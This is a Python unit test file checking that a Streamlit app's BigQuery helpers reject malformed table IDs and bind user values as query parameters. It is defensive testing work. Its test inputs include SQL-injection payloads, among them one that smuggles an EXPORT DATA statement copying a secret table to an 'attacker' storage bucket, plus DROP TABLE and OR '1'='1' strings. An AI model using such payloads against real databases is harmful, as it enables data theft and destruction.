# Copyright 2024 Google LLC.
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     https://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

"""Unit tests for ui/app.py BigQuery query validation and parameterization."""

import sys
import types
import unittest
from unittest import mock


def _install_import_fakes_if_needed() -> None:
  """Installs lightweight module fakes when cloud/UI packages are absent."""
  if "google.cloud.bigquery" not in sys.modules:
    try:
      import google.cloud.bigquery  # pylint: disable=unused-import,g-import-not-at-top
    except ImportError:
      google_pkg = sys.modules.setdefault("google", types.ModuleType("google"))
      api_core_mod = types.ModuleType("google.api_core")
      exceptions_mod = types.ModuleType("google.api_core.exceptions")

      class GoogleAPICallError(Exception):
        pass

      class Conflict(GoogleAPICallError):  # pylint: disable=g-bad-exception-name
        pass

      exceptions_mod.GoogleAPICallError = GoogleAPICallError
      exceptions_mod.Conflict = Conflict
      api_core_mod.exceptions = exceptions_mod
      google_pkg.api_core = api_core_mod
      sys.modules["google.api_core"] = api_core_mod
      sys.modules["google.api_core.exceptions"] = exceptions_mod

      cloud_pkg = types.ModuleType("google.cloud")
      bq_mod = types.ModuleType("google.cloud.bigquery")

      class ScalarQueryParameter:

        def __init__(self, name, type_, value):
          self.name = name
          self.type_ = type_
          self.value = value

      class QueryJobConfig:

        def __init__(self, query_parameters=None):
          self.query_parameters = list(query_parameters or [])

      class Client:

        def __init__(self, project=None):
          self.project = project

        def query(self, query, job_config=None):
          raise NotImplementedError

      bq_mod.ScalarQueryParameter = ScalarQueryParameter
      bq_mod.QueryJobConfig = QueryJobConfig
      bq_mod.Client = Client
      cloud_pkg.bigquery = bq_mod
      cloud_pkg.pubsub_v1 = types.ModuleType("google.cloud.pubsub_v1")
      cloud_pkg.storage = types.ModuleType("google.cloud.storage")
      google_pkg.cloud = cloud_pkg
      sys.modules["google.cloud"] = cloud_pkg
      sys.modules["google.cloud.bigquery"] = bq_mod
      sys.modules["google.cloud.pubsub_v1"] = cloud_pkg.pubsub_v1
      sys.modules["google.cloud.storage"] = cloud_pkg.storage

  try:
    from google.oauth2 import service_account  # pylint: disable=g-import-not-at-top
  except ImportError:
    google_pkg = sys.modules.setdefault("google", types.ModuleType("google"))
    oauth2_mod = types.ModuleType("google.oauth2")
    service_account = types.ModuleType("google.oauth2.service_account")

    class Credentials:

      @staticmethod
      def from_service_account_file(*unused_args, **unused_kwargs):
        return object()

    service_account.Credentials = Credentials
    oauth2_mod.service_account = service_account
    google_pkg.oauth2 = oauth2_mod
    sys.modules["google.oauth2"] = oauth2_mod
    sys.modules["google.oauth2.service_account"] = service_account

  try:
    import gspread  # pylint: disable=unused-import,g-import-not-at-top
  except ImportError:
    sys.modules["gspread"] = types.ModuleType("gspread")

  try:
    import streamlit  # pylint: disable=unused-import,g-import-not-at-top
  except ImportError:
    st_mod = types.ModuleType("streamlit")
    st_mod.error = lambda body, *, icon=None: None
    st_mod.warning = lambda body, *, icon=None: None
    st_mod.info = lambda body, *, icon=None: None
    st_mod.success = lambda body, *, icon=None: None
    st_mod.write = lambda *args, **kwargs: None
    st_mod.progress = lambda value: None
    sys.modules["streamlit"] = st_mod


_install_import_fakes_if_needed()

with mock.patch(
    "google.oauth2.service_account.Credentials.from_service_account_file",
    return_value=object(),
):
  from ui import app  # pylint: disable=g-import-not-at-top


class _FakeQueryJob:
  """In-memory fake BigQuery QueryJob returning preset rows."""

  def __init__(self, rows):
    self._rows = rows

  def result(self):
    return iter(self._rows)


class _RecordingBigQueryClient:
  """In-memory fake BigQuery client recording issued SQL and QueryJobConfigs."""

  def __init__(self, responses=None):
    self.calls = []
    self._responses = list(responses or [])

  def query(self, sql, job_config=None):
    self.calls.append((sql, job_config))
    rows = self._responses.pop(0) if self._responses else []
    return _FakeQueryJob(rows)


class AppBigQuerySecurityTest(unittest.TestCase):
  """Tests for BigQuery validation and query parameterization in ui/app.py."""

  def test_get_table_stats_rejects_backtick_injection_before_query(self):
    """Verifies get_table_stats rejects malicious table_id before querying."""
    payload = (
        "x` WHERE 1=0; EXPORT DATA OPTIONS(uri='gs://attacker/dump_*.csv') "
        "AS SELECT * FROM ds.secret; SELECT 1 FROM `y"
    )
    fake_client = _RecordingBigQueryClient()

    with mock.patch.object(app.bigquery, "Client", return_value=fake_client):
      with self.assertRaisesRegex(ValueError, "invalid BigQuery table_id"):
        app.get_table_stats("proj", "ds", payload)

    self.assertEqual(fake_client.calls, [])

  def test_get_table_stats_queries_valid_temp_table_id(self):
    """Verifies get_table_stats queries valid temp_table_id and returns counts."""
    table_id = "temp_5d41402abc4b2a76b9719d911017c592"
    fake_client = _RecordingBigQueryClient(responses=[[(10,)], [(4,)]])

    with mock.patch.object(app.bigquery, "Client", return_value=fake_client):
      total, processed = app.get_table_stats("proj", "ds", table_id)

    self.assertEqual((total, processed), (10, 4))
    self.assertEqual(len(fake_client.calls), 2)
    self.assertIn(f"`proj.ds.{table_id}`", fake_client.calls[0][0])

  def test_display_table_results_handles_invalid_table_id_without_crashing(
      self,
  ):
    """Verifies display_table_results surfaces a single-arg st.error message."""
    errors = []

    def strict_streamlit_error(body, *, icon=None):
      del icon
      errors.append(body)

    with mock.patch.object(app.st, "error", side_effect=strict_streamlit_error):
      app.display_table_results("bad`table; DROP TABLE p.d.t; --")

    self.assertEqual(
        errors,
        [
            "Unable to get table statistics. Please check that the table ID is"
            " correct."
        ],
    )

  def test_update_temp_table_parameterizes_values_and_validates_table_id(self):
    """Verifies update_temp_table binds parameters and validates table_id."""
    table_id = "temp_5d41402abc4b2a76b9719d911017c592"
    injected_video_id = "vid'); DROP TABLE p.d.t; --"
    fake_client = _RecordingBigQueryClient(responses=[[]])

    with mock.patch.object(app.bigquery, "Client", return_value=fake_client):
      app.update_temp_table("proj", "ds", table_id, injected_video_id, 2)

    self.assertEqual(len(fake_client.calls), 1)
    sql, job_config = fake_client.calls[0]
    self.assertNotIn(injected_video_id, sql)
    self.assertIn("VALUES (@video_id, @version, '')", sql)
    params = {p.name: (p.type_, p.value) for p in job_config.query_parameters}
    self.assertEqual(
        params,
        {
            "video_id": ("STRING", injected_video_id),
            "version": ("STRING", "2"),
        },
    )

    with self.assertRaisesRegex(ValueError, "invalid BigQuery table_id"):
      app.update_temp_table("proj", "ds", "bad`id", "vid1", "v1")

  def test_is_video_processed_parameterizes_filters_and_validates_table_id(
      self,
  ):
    """Verifies is_video_processed binds filter parameters and checks table_id."""
    fake_client = _RecordingBigQueryClient(responses=[[{"count": 1}]])
    injected_voice = "en-US-Standard-A' OR '1'='1"

    processed = app.is_video_processed(
        fake_client,
        "proj",
        "ds",
        "YOUR_BQ_TABLE",
        "20240101",
        "v1' OR '1'='1",
        "vid_01",
        "en-US",
        injected_voice,
    )

    self.assertTrue(processed)
    self.assertEqual(len(fake_client.calls), 1)
    sql, job_config = fake_client.calls[0]
    self.assertNotIn(injected_voice, sql)
    self.assertIn("WHERE date = DATE(@date)", sql)
    self.assertIn("AND version = @version", sql)
    params = {p.name: (p.type_, p.value) for p in job_config.query_parameters}
    self.assertEqual(
        params,
        {
            "date": ("STRING", "2024-01-01"),
            "video_id": ("STRING", "vid_01"),
            "languagecode": ("STRING", "en-US"),
            "voiceid": ("STRING", injected_voice),
            "version": ("STRING", "v1' OR '1'='1"),
        },
    )

    with self.assertRaisesRegex(ValueError, "invalid BigQuery table_id"):
      app.is_video_processed(
          fake_client,
          "proj",
          "ds",
          "YOUR_BQ_TABLE` --",
          "20240101",
          "",
          "vid_01",
          "en-US",
          "en-US-Standard-A",
      )


if __name__ == "__main__":
  unittest.main()
